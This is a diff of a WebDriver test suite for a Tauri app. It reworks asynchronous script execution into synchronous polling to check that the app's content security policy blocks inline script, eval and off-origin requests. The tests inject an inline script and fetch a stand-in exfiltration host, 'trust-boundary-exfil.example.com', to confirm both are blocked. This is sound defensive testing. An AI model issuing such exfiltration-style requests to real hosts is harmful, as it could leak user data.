@@ -30,25 +30,48 @@ interface InvokeResult {
   hasPrimitive: boolean;
 }
 
-/** Invoke a command through the REAL injected primitive in the active window and capture resolve/reject. */
-function invokeHere(cmd: string, args: Record<string, unknown>): Promise<InvokeResult> {
-  return browser.executeAsync(
-    (c: string, a: Record<string, unknown>, done: (r: InvokeResult) => void) => {
-      const inv = (window as unknown as { __TAURI_INTERNALS__?: { invoke?: unknown } })
-        .__TAURI_INTERNALS__?.invoke as
-        | ((cmd: string, args: unknown) => Promise<unknown>)
-        | undefined;
+/**
+ * Invoke a command through the REAL injected primitive and capture resolve/reject.
+ *
+ * WebKitGTK's WebDriver (via tauri-plugin-webdriver) rejects `execute/async` ("Origin header is not a valid
+ * URL"), so we kick off the async invoke with a SYNC execute that stashes the outcome on a global, then poll
+ * that global with another sync execute.
+ */
+async function invokeHere(cmd: string, args: Record<string, unknown>): Promise<InvokeResult> {
+  await browser.execute(
+    (c: string, a: Record<string, unknown>) => {
+      const w = window as unknown as {
+        __INVOKE_RESULT__?: InvokeResult;
+        __TAURI_INTERNALS__?: { invoke?: (cmd: string, args: unknown) => Promise<unknown> };
+      };
+      w.__INVOKE_RESULT__ = undefined;
+      const inv = w.__TAURI_INTERNALS__?.invoke;
       if (typeof inv !== "function") {
-        done({ resolved: false, hasPrimitive: false });
+        w.__INVOKE_RESULT__ = { resolved: false, hasPrimitive: false };
         return;
       }
       inv(c, a)
-        .then((v: unknown) => done({ resolved: true, value: v, hasPrimitive: true }))
-        .catch((e: unknown) => done({ resolved: false, error: String(e), hasPrimitive: true }));
+        .then((v: unknown) => {
+          w.__INVOKE_RESULT__ = { resolved: true, value: v, hasPrimitive: true };
+        })
+        .catch((e: unknown) => {
+          w.__INVOKE_RESULT__ = { resolved: false, error: String(e), hasPrimitive: true };
+        });
     },
     cmd,
     args,
   );
+  let res: InvokeResult | null = null;
+  await browser.waitUntil(
+    async () => {
+      res = await browser.execute(
+        () => (window as unknown as { __INVOKE_RESULT__?: InvokeResult }).__INVOKE_RESULT__ ?? null,
+      );
+      return res !== null;
+    },
+    { timeout: 8000, interval: 100, timeoutMsg: `invoke(${cmd}) did not settle` },
+  );
+  return res as unknown as InvokeResult;
 }
 
 async function switchToSettings(): Promise<string> {
@@ -112,29 +135,39 @@ describe("Trust boundary (F-012)", () => {
   });
 
   it("the strict CSP blocks inline script, eval, and off-origin fetch — but not app IPC", async () => {
-    // Inline script must NOT execute (script-src 'self', no unsafe-inline / hash for runtime-injected code).
-    const inline = await browser.executeAsync(
-      (done: (r: { ran: boolean; violation: boolean }) => void) => {
-        let violation = false;
-        document.addEventListener("securitypolicyviolation", () => {
-          violation = true;
-        });
-        const s = document.createElement("script");
-        s.textContent = "window.__CSP_INLINE_RAN__ = true;";
-        document.head.appendChild(s);
-        setTimeout(
-          () =>
-            done({
-              ran:
-                (window as unknown as { __CSP_INLINE_RAN__?: boolean }).__CSP_INLINE_RAN__ === true,
-              violation,
-            }),
-          300,
-        );
-      },
-    );
-    expect(inline.ran).toBe(false);
-    expect(inline.violation).toBe(true);
+    // Arm CSP-violation listeners + trigger inline-script injection and an off-origin fetch, stashing outcomes
+    // on globals (sync execute only — WebKitGTK rejects execute/async), then read them after a pause.
+    await browser.execute(() => {
+      const w = window as unknown as {
+        __CSP__?: { inlineViolation: boolean; connectViolation: boolean };
+        __CSP_INLINE_RAN__?: boolean;
+      };
+      w.__CSP__ = { inlineViolation: false, connectViolation: false };
+      document.addEventListener("securitypolicyviolation", (e) => {
+        const ev = e as SecurityPolicyViolationEvent;
+        const dir = ev.effectiveDirective || ev.violatedDirective || "";
+        if (dir.includes("script-src")) w.__CSP__!.inlineViolation = true;
+        if (dir.includes("connect-src")) w.__CSP__!.connectViolation = true;
+      });
+      // Inline script must NOT execute (script-src 'self', no unsafe-inline / hash for injected code).
+      const s = document.createElement("script");
+      s.textContent = "window.__CSP_INLINE_RAN__ = true;";
+      document.head.appendChild(s);
+      // Off-origin fetch is blocked BY CSP (connect-src is ipc: only).
+      fetch("https://trust-boundary-exfil.example.com/").catch(() => {});
+    });
+    await browser.pause(500);
+    const csp = await browser.execute(() => {
+      const w = window as unknown as {
+        __CSP__?: { inlineViolation: boolean; connectViolation: boolean };
+        __CSP_INLINE_RAN__?: boolean;
+      };
+      return { ...w.__CSP__, inlineRan: w.__CSP_INLINE_RAN__ === true };
+    });
+    expect(csp.inlineRan).toBe(false); // injected inline script did not run
+    expect(csp.inlineViolation).toBe(true);
+    // Assert a connect-src violation specifically — a bare fetch rejection could be DNS/TLS and prove nothing.
+    expect(csp.connectViolation).toBe(true);
 
     // eval is blocked (no unsafe-eval).
     const evalOutcome = await browser.execute(() => {
@@ -147,23 +180,6 @@ describe("Trust boundary (F-012)", () => {
       }
     });
     expect(evalOutcome).toBe("threw");
-
-    // Off-origin fetch is blocked BY CSP (connect-src is ipc: only). Assert a securitypolicyviolation whose
-    // directive is connect-src — a bare fetch rejection could also be DNS/TLS failure and prove nothing.
-    const fetchOutcome = await browser.executeAsync(
-      (done: (r: { cspBlocked: boolean }) => void) => {
-        let cspBlocked = false;
-        document.addEventListener("securitypolicyviolation", (e) => {
-          const ev = e as SecurityPolicyViolationEvent;
-          const dir = ev.effectiveDirective || ev.violatedDirective || "";
-          if (dir.includes("connect-src")) cspBlocked = true;
-        });
-        fetch("https://trust-boundary-exfil.example.com/")
-          .catch(() => {})
-          .finally(() => setTimeout(() => done({ cspBlocked }), 300));
-      },
-    );
-    expect(fetchOutcome.cspBlocked).toBe(true);
   });
 
   it("blocks off-origin navigation and window.open (Rust on_navigation/on_new_window)", async () => {
